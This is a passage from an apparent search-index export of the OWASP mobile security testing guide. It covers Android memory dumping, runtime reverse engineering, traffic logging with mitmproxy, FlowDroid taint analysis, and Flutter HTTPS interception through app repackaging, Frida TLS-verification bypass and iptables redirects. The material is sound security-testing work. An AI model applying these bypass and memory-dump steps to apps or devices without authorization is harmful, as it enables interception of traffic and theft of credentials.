/system/framework/arm64/boot-ext.vdex\n</code></pre> <p>Additionally, you can search for occurrences of the wide version of the string (<code>:/w</code>) and, again, check their memory regions:</p> <pre><code>[0x00000000]&gt; :/w Hello\nSearching 10 bytes: 48 00 65 00 6c 00 6c 00 6f 00\nhits: 6\n0x13102acc hit1_0 480065006c006c006f00\n0x13102b9c hit1_1 480065006c006c006f00\n0x7d30a53aa0 hit1_2 480065006c006c006f00\n0x7d30a872b0 hit1_3 480065006c006c006f00\n0x7d30bb9568 hit1_4 480065006c006c006f00\n0x7d30bb9a68 hit1_5 480065006c006c006f00\n\n[0x00000000]&gt; :dm.@@ hit1_*\n0x0000000013100000 - 0x0000000013140000 rw- /dev/ashmem/dalvik-main space (region space) (deleted)\n0x0000000013100000 - 0x0000000013140000 rw- /dev/ashmem/dalvik-main space (region space) (deleted)\n0x0000007d30a00000 - 0x0000007d30c00000 rw-\n0x0000007d30a00000 - 0x0000007d30c00000 rw-\n0x0000007d30a00000 - 0x0000007d30c00000 rw-\n0x0000007d30a00000 - 0x0000007d30c00000 rw-\n</code></pre> <p>They are in the same rw- region as one of the previous strings (<code>0x0000007d30a00000</code>). Note that searching for the wide versions of strings is sometimes the only way to find them as you'll see in the following section.</p> <p>In-memory search can be very useful to quickly know if certain data is located in the main app binary, inside a shared library or in another region. You may also use it to test the behavior of the app regarding how the data is kept in memory. For instance, you could analyze an app that performs a login and search for occurrences of the user password. Also, you may check if you still can find the password in memory after the login is completed to verify if this sensitive data is wiped from memory after its use.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0044/#memory-dump","title":"Memory Dump","text":"<p>You can dump the app's process memory with  objection and  Fridump. To take advantage of these tools on a non-rooted device, the Android app must be repackaged with <code>frida-gadget.so</code> and re-signed. A detailed explanation of this process can be found at  Dynamic Analysis on Non-Rooted Devices. To use these tools on a rooted device, simply have frida-server installed and running.</p> <p>Note: When using these tools, you might get several memory access violation errors which can normally be ignored. These tools inject a Frida agent and try to dump all the mapped memory of the app regardless of the access permissions (read/write/execute). Therefore, when the injected Frida agent tries to read a region that's not readable, it'll return the corresponding memory access violation errors. Refer to previous section \"Memory Maps and Inspection\" for more details.</p> <p>With objection it is possible to dump all memory of the running process on the device by using the command <code>memory dump all</code>.</p> <pre><code>$ objection --gadget sg.vantagepoint.helloworldjni explore\n\nsg.vantagepoint.helloworldjni on (google: 8.1.0) [usb] # memory dump all /Users/foo/memory_Android/memory\n\nWill dump 719 rw- images, totalling 1.6 GiB\nDumping 1002.8 MiB from base: 0x14140000  [------------------------------------]    0%  00:11:03(session detach message) process-terminated\nDumping 8.0 MiB from base: 0x7fc753e000  [####################################]  100%\nMemory dumped to file: /Users/foo/memory_Android/memory\n</code></pre> <p>In this case there was an error, which is probably due to memory access violations as we already anticipated. This error can be safely ignored as long as we are able to see the extracted dump in the file system. If you have any problems, a first step would be to enable the debug flag <code>-d</code> when running objection or, if that doesn't help, file an issue in objection's GitHub.</p> <p>Next, we are able to find the \"Hello from C++\" strings with radare2:</p> <pre><code>$ r2 /Users/foo/memory_Android/memory\n[0x00000000]&gt; izz~Hello from\n1136 0x00065270 0x00065270  14  15 () ascii Hello from C++\n</code></pre> <p>Alternatively you can use Fridump. This time, we will input a string and see if we can find it in the memory dump. For this, open the  MASTG Hacking Playground (Java) app, navigate to \"OMTG_DATAST_002_LOGGING\" and enter \"owasp-mstg\" to the password field. Next, run Fridump:</p> <pre><code>python3 fridump.py -U sg.vp.owasp_mobile.omtg_android -s\n\nCurrent Directory: /Users/foo/git/fridump\nOutput directory is set to: /Users/foo/git/fridump/dump\nStarting Memory dump...\nOops, memory access violation!-------------------------------] 0.28% Complete\nProgress: [##################################################] 99.58% Complete\nRunning strings on all files:\nProgress: [##################################################] 100.0% Complete\n\nFinished!\n</code></pre> <p>Tip: Enable verbosity by including the flag <code>-v</code> if you want to see more details, e.g. the regions provoking memory access violations.</p> <p>It will take a while until it's completed and you'll get a collection of *.data files inside the dump folder. When you add the <code>-s</code> flag, all strings are extracted from the dumped raw memory files and added to the file <code>strings.txt</code>, which is also stored in the dump directory.</p> <pre><code>ls dump/\ndump/1007943680_dump.data dump/357826560_dump.data  dump/630456320_dump.data ... strings.txt\n</code></pre> <p>Finally, search for the input string in the dump directory:</p> <pre><code>$ grep -nri owasp-mstg dump/\nBinary file dump//316669952_dump.data matches\nBinary file dump//strings.txt matches\n</code></pre> <p>The \"owasp-mstg\" string can be found in one of the dump files as well as in the processed strings file.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0045/","title":"MASTG-TECH-0045: Runtime Reverse Engineering","text":"<p>Runtime reverse engineering can be seen as the on-the-fly version of reverse engineering where you don't have the binary data to your host computer. Instead, you'll analyze it straight from the memory of the app.</p> <p>We'll keep using the HelloWorld JNI app, open a session with r2frida <code>r2 frida://usb//sg.vantagepoint.helloworldjni</code> and you can start by displaying the target binary information by using the <code>:i</code> command:</p> <pre><code>[0x00000000]&gt; :i\narch                arm\nbits                64\nos                  linux\npid                 13215\nuid                 10096\nobjc                false\nruntime             V8\njava                true\ncylang              false\npageSize            4096\npointerSize         8\ncodeSigningPolicy   optional\nisDebuggerAttached  false\ncwd                 /\ndataDir             /data/user/0/sg.vantagepoint.helloworldjni\ncodeCacheDir        /data/user/0/sg.vantagepoint.helloworldjni/code_cache\nextCacheDir         /storage/emulated/0/Android/data/sg.vantagepoint.helloworldjni/cache\nobbDir              /storage/emulated/0/Android/obb/sg.vantagepoint.helloworldjni\nfilesDir            /data/user/0/sg.vantagepoint.helloworldjni/files\nnoBackupDir         /data/user/0/sg.vantagepoint.helloworldjni/no_backup\ncodePath            /data/app/sg.vantagepoint.helloworldjni-1/base.apk\npackageName         sg.vantagepoint.helloworldjni\nandroidId           c92f43af46f5578d\ncacheDir            /data/local/tmp\njniEnv              0x7d30a43c60\n</code></pre> <p>Search all symbols of a certain module with <code>:is &lt;lib&gt;</code>, e.g. <code>:is libnative-lib.so</code>.</p> <pre><code>[0x00000000]&gt; :is libnative-lib.so\n\n[0x00000000]&gt;\n</code></pre> <p>Which are empty in this case. Alternatively, you might prefer to look into the imports/exports. For example, list the imports with <code>:ii &lt;lib&gt;</code>:</p> <pre><code>[0x00000000]&gt; :ii libnative-lib.so\n0x7dbe1159d0 f __cxa_finalize /system/lib64/libc.so\n0x7dbe115868 f __cxa_atexit /system/lib64/libc.so\n</code></pre> <p>And list the exports with <code>:iE &lt;lib&gt;</code>:</p> <pre><code>[0x00000000]&gt; :iE libnative-lib.so\n0x7d1c49954c f Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI\n</code></pre> <p>For big binaries it's recommended to pipe the output to the internal less program by appending <code>~..</code>, i.e. <code>:ii libandroid_runtime.so~..</code> (if not, for this binary, you'd get almost 2500 lines printed to your terminal).</p> <p>The next thing you might want to look at are the currently loaded Java classes:</p> <pre><code>[0x00000000]&gt; :ic~sg.vantagepoint.helloworldjni\nsg.vantagepoint.helloworldjni.MainActivity\n</code></pre> <p>List class fields:</p> <pre><code>[0x00000000]&gt; :ic sg.vantagepoint.helloworldjni.MainActivity~sg.vantagepoint.helloworldjni\npublic native java.lang.String sg.vantagepoint.helloworldjni.MainActivity.stringFromJNI()\npublic sg.vantagepoint.helloworldjni.MainActivity()\n</code></pre> <p>Note that we've filtered by package name as this is the <code>MainActivity</code> and it includes all methods from Android's <code>Activity</code> class.</p> <p>You can also display information about the class loader:</p> <pre><code>[0x00000000]&gt; :icL\ndalvik.system.PathClassLoader[\n DexPathList[\n  [\n   directory \".\"]\n  ,\n  nativeLibraryDirectories=[\n   /system/lib64,\n    /vendor/lib64,\n    /system/lib64,\n    /vendor/lib64]\n  ]\n ]\njava.lang.BootClassLoader@b1f1189dalvik.system.PathClassLoader[\n DexPathList[\n  [\n   zip file \"/data/app/sg.vantagepoint.helloworldjni-1/base.apk\"]\n  ,\n  nativeLibraryDirectories=[\n   /data/app/sg.vantagepoint.helloworldjni-1/lib/arm64,\n    /data/app/sg.vantagepoint.helloworldjni-1/base.apk!/lib/arm64-v8a,\n    /system/lib64,\n    /vendor/lib64]\n  ]\n ]\n</code></pre> <p>Next, imagine that you are interested into the method exported by libnative-lib.so <code>0x7d1c49954c f Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI</code>. You can seek to that address with <code>s 0x7d1c49954c</code>, analyze that function <code>af</code> and print 10 lines of its disassembly <code>pd 10</code>:</p> <pre><code>[0x7d1c49954c]&gt; pdf\n            ;-- sym.fun.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI:\n\u256d (fcn) fcn.7d1c49954c 18\n\u2502   fcn.7d1c49954c (int32_t arg_40f942h);\n\u2502           ; arg int32_t arg_40f942h @ x29+0x40f942\n\u2502           0x7d1c49954c      080040f9       ldr x8, [x0]\n\u2502           0x7d1c499550      01000090       adrp x1, 0x7d1c499000\n\u2502           0x7d1c499554      21801591       add x1, x1, 0x560         ; hit0_4\n\u2502           0x7d1c499558      029d42f9       ldr x2, [x8, 0x538]       ; [0x538:4]=-1 ; 1336\n\u2502           0x7d1c49955c      4000           invalid\n</code></pre> <p>Note that the line tagged with <code>; hit0_4</code> corresponds to the string that we've previously found: <code>0x7d1c499560 hit0_4 Hello from C++</code>.</p> <p>To learn more, please refer to the r2frida wiki.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0100/","title":"MASTG-TECH-0100: Logging Sensitive Data from Network Traffic","text":"<p> mitmproxy can be used to intercept network traffic from Android apps. This technique is useful for identifying sensitive data that is sent over the network, as well as for identifying potential security vulnerabilities.</p> <p>Once with mitmproxy installed and your device configured to use it, you can create a python script to filter the traffic and extract the sensitive data. For example, the following script will extract all the data sent in the requests and responses only if the data is considered sensitive. For this example we consider sensitive data to be any data that contains the strings \"dummyPassword\" or \"sampleUser\", so we include them in the <code>SENSITIVE_STRINGS</code> list.</p> <pre><code># mitm_sensitive_logger.py\n\nfrom mitmproxy import http\n\n# This data would come from another file and should be defined after identifying the data that is considered sensitive for this application.\n# For example by using the Google Play Store Data Safety section.\nSENSITIVE_DATA = {\n    \"precise_location_latitude\": \"37.7749\",\n    \"precise_location_longitude\": \"-122.4194\",\n    \"name\": \"John Doe\",\n    \"email_address\": \"john.doe@example.com\",\n    \"phone_number\": \"+11234567890\",\n    \"credit_card_number\": \"1234 5678 9012 3456\"\n}\n\nSENSITIVE_STRINGS = SENSITIVE_DATA.values()\n\ndef contains_sensitive_data(string):\n    return any(sensitive in string for sensitive in SENSITIVE_STRINGS)\n\ndef process_flow(flow):\n    url = flow.request.pretty_url\n    request_headers = flow.request.headers\n    request_body = flow.request.text\n    response_headers = flow.response.headers if flow.response else \"No response\"\n    response_body = flow.response.text if flow.response else \"No response\"\n\n    if (contains_sensitive_data(url) or \n        contains_sensitive_data(request_body) or \n        contains_sensitive_data(response_body)):\n        with open(\"sensitive_data.log\", \"a\") as file:\n            if flow.response:\n                file.write(f\"RESPONSE URL: {url}\\n\")\n                file.write(f\"Response Headers: {response_headers}\\n\")\n                file.write(f\"Response Body: {response_body}\\n\\n\")\n            else:\n                file.write(f\"REQUEST URL: {url}\\n\")\n                file.write(f\"Request Headers: {request_headers}\\n\")\n                file.write(f\"Request Body: {request_body}\\n\\n\")\ndef request(flow: http.HTTPFlow):\n    process_flow(flow)\n\ndef response(flow: http.HTTPFlow):\n    process_flow(flow)\n</code></pre> <p>Now you can run mitmproxy with the script:</p> <pre><code>mitmdump -s mitm_sensitive_logger.py\n</code></pre> <p>Our example app has this code:</p> <pre><code>fun testPostRequest() {\n    val thread = Thread {\n        try {\n            val url = URL(\"https://httpbin.org/post\")\n            val httpURLConnection = url.openConnection() as HttpURLConnection\n            httpURLConnection.requestMethod = \"POST\"\n            httpURLConnection.doOutput = true\n            httpURLConnection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\")\n\n            val user = \"sampleUser\"\n            val password = \"dummyPassword\"\n\n            val postData = \"username=$user&amp;password=$password\"\n\n            val outputStream = BufferedOutputStream(httpURLConnection.outputStream)\n            val bufferedWriter = BufferedWriter(OutputStreamWriter(outputStream, \"UTF-8\"))\n            bufferedWriter.write(postData)\n            bufferedWriter.flush()\n            bufferedWriter.close()\n            outputStream.close()\n\n            val responseCode = httpURLConnection.responseCode\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                Log.d(\"HTTP_SUCCESS\", \"Successfully authenticated.\")\n            } else {\n                Log.e(\"HTTP_ERROR\", \"Failed to authenticate. Response code: $responseCode\")\n            }\n\n        } catch (e: Exception) {\n            e.printStackTrace()\n        }\n    }\n    thread.start()\n}\n</code></pre> <p>The app sends a POST request to <code>https://httpbin.org/post</code> with the body <code>username=sampleUser&amp;password=dummyPassword</code>. <code>httpbin.org</code> is a website that returns the request data in the response body, so we can see the data that was sent in the request.</p> <p>Run the app and use it as you normally would. The script will log any sensitive data that is sent over the network to the <code>sensitive_data.log</code> file.</p> <p>Example console output:</p> <pre><code>[10:07:59.348] Loading script mitm_sensitive_logger.py\n[10:07:59.351] HTTP(S) proxy listening at *:8080.\n[10:08:08.188][127.0.0.1:64701] server connect httpbin.org:443 (52.206.94.89:443)\n[10:08:08.192][127.0.0.1:64709] server connect mas.owasp.org:443 (104.22.27.77:443)\n[10:08:08.245][127.0.0.1:64709] Client TLS handshake failed. The client does not trust the proxy's certificate for mas.owasp.org (OpenSSL Error([('SSL routines', '', 'ssl/tls alert certificate unknown')]))\n[10:08:08.246][127.0.0.1:64709] client disconnect\n[10:08:08.246][127.0.0.1:64709] server disconnect mas.owasp.org:443 (104.22.27.77:443)\n127.0.0.1:64701: POST https://httpbin.org/post\n              &lt;&lt; 200 OK 548b\n</code></pre> <p>Example <code>sensitive_data.log</code> output:</p> <pre><code>REQUEST URL: https://httpbin.org/post\nRequest Headers: Headers[(b'Content-Type', b'application/x-www-form-urlencoded'), (b'User-Agent', b'Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone64_arm64 Build/TE1A.220922.021)'), (b'Host', b'httpbin.org'), (b'Connection', b'Keep-Alive'), (b'Accept-Encoding', b'gzip'), (b'Content-Length', b'42')]\nRequest Body: username=sampleUser&amp;password=dummyPassword\n\nRESPONSE URL: https://httpbin.org/post\nResponse Headers: Headers[(b'Date', b'Tue, 16 Jan 2024 09:08:08 GMT'), (b'Content-Type', b'application/json'), (b'Content-Length', b'548'), (b'Connection', b'keep-alive'), (b'Server', b'gunicorn/19.9.0'), (b'Access-Control-Allow-Origin', b'*'), (b'Access-Control-Allow-Credentials', b'true')]\nResponse Body: {\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"password\": \"dummyPassword\", \n    \"username\": \"sampleUser\"\n  }, \n  \"headers\": {\n    \"Accept-Encoding\": \"gzip\", \n    \"Content-Length\": \"42\", \n    \"Content-Type\": \"application/x-www-form-urlencoded\", \n    \"Host\": \"httpbin.org\", \n    \"User-Agent\": \"Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone64_arm64 Build/TE1A.220922.021)\", \n    \"X-Amzn-Trace-Id\": \"Root=1-65a64778-78495e9f5d742c9b0c7a75d8\"\n  }, \n  \"json\": null, \n  \"origin\": \"148.141.65.87\", \n  \"url\": \"https://httpbin.org/post\"\n}\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0108/","title":"MASTG-TECH-0108: Taint Analysis","text":"<p>Taint analysis is an information flow analysis technique that tracks the flow of sensitive information within a program. For example, it can determine whether geolocation data collected in an Android app is being transmitted to third-party domains.</p> <p>In taint analysis, data flows from a \"source\" to a \"sink\". A source is where sensitive information originates, and a sink is where this information is ultimately utilized. For instance, we can determine if the device ID retrieved by a <code>getDeviceId()</code> function is transmitted as a text message via another function <code>sendTextMessage()</code>. In this scenario, <code>getDeviceId()</code> is the source, and <code>sendTextMessage()</code> is the sink. If a direct path exists between them, it's called a leak.</p> <p>In large applications, manual information flow analysis can be very time consuming and inaccurate. Taint analysis automates this, with two main methods: static and dynamic. The former examines code without running it, offering broad coverage but potentially yielding false positives. In contrast, dynamic analysis observes real-time application execution, providing actual context but possibly overlooking untriggered issues. A thorough comparison of these techniques is beyond this section's scope.</p> <p>There are multiple tools which perform taint analysis on native code, including Triton and bincat. However, in this section, we'll primarily focus on Android Java code and utilize  FlowDroid for the taint analysis. Another notable tool supporting taint analysis for Android apps is GDA.</p> <p>For our demonstration, we'll use the  FlowDroid command line tool to perform taint analysis on the InsecureShop v1.0 application.</p> <p>The InsecureShop app accepts a username and password as input and stores them in the app's shared preferences. In our taint analysis, we're interested in how this stored username and password are used. In this context, the username and password are the sensitive information, and reading from shared preferences is the source. The sink in this analysis could be various operations, such as sending info over the network, transmitting info via an <code>Intent</code>, or storing info in an external file.</p> <p>To use FlowDroid, firstly, we need to provide an input list of potential sources and sinks to evaluate for. In our case, reading from shared preferences will be the source, while adding parameters to an <code>Intent</code> will be the sink. The configuration file will look as follows (we'll name it \"source_sink.txt\"):</p> <pre><code>&lt;android.content.SharedPreferences: java.lang.String getString(java.lang.String, java.lang.String)&gt; -&gt; _SOURCE_\n\n&lt;android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.CharSequence)&gt; -&gt; _SINK_\n&lt;android.content.Intent: android.content.Intent putExtra(java.lang.String,char)&gt; -&gt; _SINK_\n&lt;android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)&gt; -&gt; _SINK_\n</code></pre> <p>To invoke FlowDroid via the command line, use the following command:</p> <pre><code>java -jar soot-infoflow-cmd/target/soot-infoflow-cmd-jar-with-dependencies.jar \\\n    -a InsecureShop.apk \\\n    -p Android/Sdk/platforms \\\n    -s source_sink.txt\n\n\n[main] INFO soot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow - The sink virtualinvoke r2.&lt;android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)&gt;(\"password\", $r5) in method &lt;com.insecureshop.AboutUsActivity: void onSendData(android.view.View)&gt; was called with values from the following sources:\n\n[main] INFO soot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow - - $r1 = interfaceinvoke $r2.&lt;android.content.SharedPreferences: java.lang.String getString(java.lang.String,java.lang.String)&gt;(\"password\", \"\") in method &lt;com.insecureshop.util.Prefs: java.lang.String getPassword()&gt;\n\n...\n\n[main] INFO soot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow - The sink virtualinvoke r2.&lt;android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)&gt;(\"username\", $r4) in method &lt;com.insecureshop.AboutUsActivity: void onSendData(android.view.View)&gt; was called with values from the following sources:\n\n[main] INFO soot.jimple.infoflow.android.SetupApplication$InPlaceInfoflow - - $r1 = interfaceinvoke $r2.&lt;android.content.SharedPreferences: java.lang.String getString(java.lang.String,java.lang.String)&gt;(\"username\", \"\") in method &lt;com.insecureshop.util.Prefs: java.lang.String getUsername()&gt;\n\n...\n\n[main] INFO soot.jimple.infoflow.android.SetupApplication - Found 2 leaks\n</code></pre> <p>The output also uses the jimple intermediate representation and reveals two leaks in the application, each corresponding to the username and password. Given that the InsecureShop app is open-source, we can refer to its source code to validate the findings, as shown below:</p> <pre><code>// file: AboutActivity.kt\n\nfun onSendData(view: View) {\n        val userName = Prefs.username!!\n        val password = Prefs.password!!\n\n        val intent = Intent(\"com.insecureshop.action.BROADCAST\")\n        intent.putExtra(\"username\", userName)\n        intent.putExtra(\"password\", password)\n        sendBroadcast(intent)\n\n        textView.text = \"InsecureShop is an intentionally designed vulnerable android app built in Kotlin.\"\n\n    }\n</code></pre> <p>Taint analysis is especially beneficial for automating data flow analysis in intricate applications. However, given the complexity of some apps, the accuracy of such tools can vary. Thus, it's essential for reviewers to find a balance between the accuracy of tools and the time spent on manual analysis.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0109/","title":"MASTG-TECH-0109: Intercepting Flutter HTTPS Traffic","text":"<p>Flutter is an open-source UI software development kit (SDK) created by Google. It is used to build natively compiled applications for mobile, web, and desktop from a single codebase. Flutter uses Dart, which is not proxy-aware and uses its own certificate store. A Flutter mobile app doesn't use the system's proxy configuration and sends the data directly to the server. Connections are verified against built-in certificates, so any certificates installed on the system are simply ignored. This makes it impossible to intercept HTTPS requests through a standard MiTM setup, as the proxy's certificate is never trusted.</p> <p>To intercept HTTPS traffic from a Flutter app, we have to deal with two challenges:</p> <ul> <li>Ensure that the traffic is sent to the proxy.</li> <li>Disable TLS verification on any HTTPS connection.</li> </ul> <p>There are generally two approaches to this:  reFlutter and  Frida for Android.</p> <ul> <li>reFlutter: This tool creates a modified version of the Flutter module which is then repackaged into the APK. It configures the internal libraries to use a specified proxy and disables the TLS verification.</li> <li>Frida: The disable-flutter-tls.js script can dynamically remove the TLS verification without the need for repackaging. As it doesn't modify the proxy configuration, additional steps are needed (e.g. ProxyDroid, DNS, iptables, ...).</li> </ul>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0109/#intercepting-traffic-using-reflutter","title":"Intercepting Traffic using reFlutter","text":"<ol> <li> <p>Patch the app to enable traffic interception.</p> <p>Run the command to patch the app and select the option Traffic monitoring and interception and then enter the IP of the machine on which the interception proxy is running.</p> <pre><code>$ reflutter demo.apk\n\nChoose an option:\n\n    Traffic monitoring and interception\n    Display absolute code offset for functions\n\n[1/2]? 1\n\nExample: (192.168.1.154) etc.\nPlease enter your BurpSuite IP: 192.168.29.216\n</code></pre> <p>This will create a release.RE.apk file in the output folder.</p> </li> <li> <p>Sign the patched release.RE.apk file (e.g. using  uber-apk-signer).</p> <pre><code>java -jar uber-apk-signer.jar -a release.RE.apk --out demo-signed\n</code></pre> <p>This will create a release.RE-aligned-debugSigned.apk file in the output folder.</p> </li> <li> <p>Install the signed patched app on the mobile device.</p> </li> <li> <p>Configure the interception proxy. For example, in  Burp Suite:</p> </li> <li> <p>Under Proxy -&gt; Proxy settings -&gt; Add new Proxy setting.</p> </li> <li>Bind listening Port to <code>8083</code>.</li> <li>Select <code>Bind to address</code> to <code>All interfaces</code>.</li> <li> <p>Request Handling -&gt; support for invisible proxying.</p> </li> <li> <p>Open the app and start intercepting traffic.</p> </li> </ol>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0109/#intercepting-traffic-using-proxydroid-iptables-with-frida","title":"Intercepting Traffic using ProxyDroid / iptables with Frida","text":"<p>You can either configure  ProxyDroid or create <code>iptables</code> rules to redirect HTTP requests to Burp.</p> <ul> <li> <p>If you are not using proxyDroid, execute the following commands on the rooted Android device to configure <code>iptables</code> to redirect the incoming requests from the application to  Burp Suite:</p> <pre><code>$ iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination &lt;Your-Proxy-IP&gt;:8080 \n\n$ iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination &lt;Your-Proxy-IP&gt;:8080 \n</code></pre> </li> <li> <p>Configure the interception proxy, like  Burp Suite:</p> <ul> <li>Under Proxy -&gt; Proxy settings -&gt; Add new Proxy setting.</li> <li>Bind listening Port to <code>8080</code>.</li> <li>Select <code>Bind to address</code> to <code>All interfaces</code>.</li> <li>Request Handling -&gt; support for invisible proxying.</li> </ul> </li> <li> <p>Run the  disable-flutter-tls-verification Frida script.</p> <pre><code>$ frida -U -f eu.nviso.flutterPinning -l disable-flutter-tls.js\n</code></pre> </li> <li> <p>Use the app and you should be able to intercept HTTP traffic of the Flutter app.</p> </li> </ul> <p>Further explanations for this setup can be found in the blog post from Nviso.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0112/","title":"MASTG-TECH-0112: Reverse Engineering Flutter Applications","text":"<p>Flutter is an open source UI SDK from Google for building natively compiled applications for mobile, web, and desktop from a single codebase. Dart, the programming language used in Flutter, is key to its functionality, offering language features and performance optimizations that enable efficient development of high-quality cross-platform apps.</p> <p>A Dart snapshot is a pre-compiled representation of a Dart program that allows for faster startup times and efficient execution. Flutter application development focuses is on the AOT (Ahead-of-Time) snapshot, which is used in all Flutter mobile apps.</p> <p>There are significant challenges in reverse engineering Dart AOT snapshots due to several factors:</p> <ol> <li>Distinctive Assembly Code: The generated assembly code uses unique registers, calling conventions, and integer encoding, complicating analysis.</li> <li>Sequential Class Information: Information about each class in the Dart AOT snapshot must be read sequentially, preventing random access and making it time-consuming to locate specific classes.</li> <li>Lack of Documentation: The Dart snapshot format lacks comprehensive documentation and has evolved over time, adding to the complexity.</li> <li>Obfuscation and Optimization: Flutter's build process may include obfuscation and optimization techniques that hinder reverse engineering efforts.</li> </ol> <p>Because of these challenges, analyzing Flutter applications effectively requires specialized tools and methods.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0112/#using-blutter","title":"Using Blutter","text":"<p>To use  Blutter, you need to:</p> <ol> <li>Extract the APK: Unpack the APK file and locate the libapp.so file.</li> <li>Execute Blutter: Run Blutter with the path to the libapp.so file and specify an output directory.</li> </ol> <pre><code>python3 blutter.py path/to/app/lib/arm64-v8a out_dir\n</code></pre> <p>Blutter generates several files:</p> <ul> <li><code>asm/*</code>: Assembly files with symbols.</li> <li><code>blutter_frida.js</code>: A Frida script template for instrumenting the app.</li> <li><code>objs.txt</code>: A complete nested dump of objects from the object pool.</li> <li><code>pp.txt</code>: All Dart objects in the object pool.</li> </ul> <p>The assembly files in <code>asm/*</code> contain reconstructed functions with names, making it easier to trace the app's logic. Here's an excerpt of a <code>main</code> function:</p> <pre><code>  static _ main(/* No info */) async {\n    // ** addr: 0x5961e0, size: 0x230\n    // 0x5961e0: EnterFrame\n    //     0x5961e0: stp             fp, lr, [SP, #-0x10]!\n    //     0x5961e4: mov             fp, SP\n    // 0x5961e8: AllocStack(0x28)\n    //     0x5961e8: sub             SP, SP, #0x28\n    // 0x5961ec: SetupParameters()\n    //     0x5961ec: stur            NULL, [fp, #-8]\n    // 0x5961f0: CheckStackOverflow\n    //     0x5961f0: ldr             x16, [THR, #0x38]  ; THR::stack_limit\n    //     0x5961f4: cmp             SP, x16\n    //     0x5961f8: b.ls            #0x596400\n    // 0x5961fc: InitAsync() -&gt; Future&lt;void?&gt;\n    //     0x5961fc: ldr             x0, [PP, #0x80]  ; [pp+0x80] TypeArguments: &lt;void?&gt;\n    //     0x596200: bl              #0x3a5d48\n    // 0x596204: r0 = ensureInitialized()\n    //     0x596204: bl              #0x570d8c  ; [package:flutter/src/widgets/binding.dart] WidgetsFlutterBinding::ensureInitialized\n    // 0x596208: r0 = init()\n    //     0x596208: bl              #0x59a98c  ; [package:get_secure_storage/src/storage_impl.dart] GetSecureStorage::init\n    // 0x59620c: mov             x1, x0\n    // 0x596210: stur            x1, [fp, #-0x10]\n    // 0x596214: r0 = Await()\n</code></pre> <p>While this code is not as easy to understand as typical decompiled Java code, a lot of information is still available. At the top, we can see the name of the function (<code>main</code>), as well as the location of the function in the original <code>libapp.so</code> binary. The different jump instructions (<code>bl</code>) are accompanied by symbol information, making it easier to understand what the code is doing. For example, we can see that the app first makes sure that the Flutter bindings are correctly initialized (<code>WidgetsFlutterBinding::ensureInitialized</code>), followed by the initialization of the <code>get_secure_storage</code> plugin (<code>GetSecureStorage::init</code>).</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0115/","title":"MASTG-TECH-0115: Obtaining Compiler-Provided Security Features","text":"<p>Run  rabin2 on the target binary, for example a shared library and grep for the keywords you'd like to check for.</p> <pre><code>rabin2 -I lib/x86_64/libnative-lib.so | grep -E \"canary|pic\"\ncanary   false\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0116/","title":"MASTG-TECH-0116: Obtaining Information about the APK Signature","text":"","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0116/#verify-apk-signatures","title":"Verify APK Signatures","text":"<p> apksigner can be used to verify APK signatures:</p> <pre><code>$ apksigner verify --verbose example.apk\nVerifies\nVerified using v1 scheme (JAR signing): false\nVerified using v2 scheme (APK Signature Scheme v2): true\nVerified using v3 scheme (APK Signature Scheme v3): true\nVerified using v3.1 scheme (APK Signature Scheme v3.1): false\nVerified using v4 scheme (APK Signature Scheme v4): false\nVerified for SourceStamp: false\nNumber of signers: 1\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0116/#additional-signature-information","title":"Additional Signature Information","text":"<p>Additional information about the signature including fields from the signing certificate, digest and key information can be also examined with  apksigner:</p> <pre><code>$ apksigner verify --print-certs --verbose example.apk\n[...]\nSigner #1 certificate DN: CN=Example Developers, OU=Android, O=Example\nSigner #1 certificate SHA-256 digest: 1fc4de52d0daa33a9c0e3d67217a77c895b46266ef020fad0d48216a6ad6cb70\nSigner #1 certificate SHA-1 digest: 1df329fda8317da4f17f99be83aa64da62af406b\nSigner #1 certificate MD5 digest: 3dbdca9c1b56f6c85415b67957d15310\nSigner #1 key algorithm: RSA\nSigner #1 key size (bits): 2048\nSigner #1 public key SHA-256 digest: 296b4e40a31de2dcfa2ed277ccf787db0a524db6fc5eacdcda5e50447b3b1a26\nSigner #1 public key SHA-1 digest: 3e02ebf64f1bd4ca85732186b3774e9ccd60cb86\nSigner #1 public key MD5 digest: 24afa3496f98c66343fc9c8a0a7ff5a2\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0117/","title":"MASTG-TECH-0117: Obtaining Information from the AndroidManifest","text":"<p>The AndroidManifest.xml file is a critical component of any Android application, providing essential information about the app's structure, permissions, components, and configurations. During a security assessment, analyzing the manifest can reveal potential vulnerabilities or misconfigurations that could be exploited by attackers.</p> <p>The AndroidManifest is stored in a binary XML format and cannot simply be extracted from the APK 